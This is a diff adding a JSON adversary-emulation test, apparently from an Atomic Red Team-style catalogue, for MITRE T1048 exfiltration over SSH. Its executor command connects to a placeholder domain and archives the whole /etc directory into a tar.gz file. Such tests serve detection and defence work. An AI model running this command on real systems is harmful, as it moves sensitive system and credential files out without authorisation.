@@ -1,0 +1,30 @@
+{
+    "name": "Exfiltration Over Alternative Protocol - SSH",
+    "description": "Input a domain and test Exfiltration over SSH  Remote to Local  Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file. ",
+    "supported_platforms": [
+        "macos",
+        "linux"
+    ],
+    "executor": {
+        "command": "ssh #{domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz\n",
+        "name": "sh",
+        "type": "Command Executor"
+    },
+    "id": "T1048",
+    "tactics": [
+        "Exfiltration"
+    ],
+    "technique": "Exfiltration Over Alternative Protocol",
+    "source": "ART",
+    "uuid": "f6786cc8-beda-4915-a4d6-ac2f193bb988",
+    "arguments": {
+        "domain": {
+            "description": "target SSH domain",
+            "type": "url",
+            "default": "target.example.com"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
